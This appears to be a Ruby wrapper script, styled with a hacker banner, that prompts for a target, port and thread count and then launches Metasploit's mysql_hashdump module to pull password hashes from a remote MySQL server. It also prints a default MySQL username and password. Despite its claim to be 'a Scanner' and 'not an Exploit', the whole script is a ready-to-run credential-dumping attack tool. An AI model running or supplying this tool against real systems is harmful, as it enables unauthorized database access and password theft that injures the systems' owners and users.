require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
        MYSQL Password Hashdumpr

  Its a Scanner!! This is not an Exploit!      
""".red
puts """
    The HTTP Server's remote port 80
     The MySQL's remote port is 3306
   The default MySQL password is admin
 The default MySQL username is scrutremote
""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp


puts " [?] What is the port? ".blue
print "[!] ---> ".yellow
port = gets.chomp

puts " [?] How many threads for this attack? [1-10]".blue
print "[!] ---> ".yellow
thread = gets.chomp

exec("msfconsole -x 'use auxiliary/scanner/mysql/mysql_hashdump' -x 'setg RHOSTS #{target}' -x 'setg RPORT #{port}' -x 'setg THREADS #{thread}' -x 'run'")


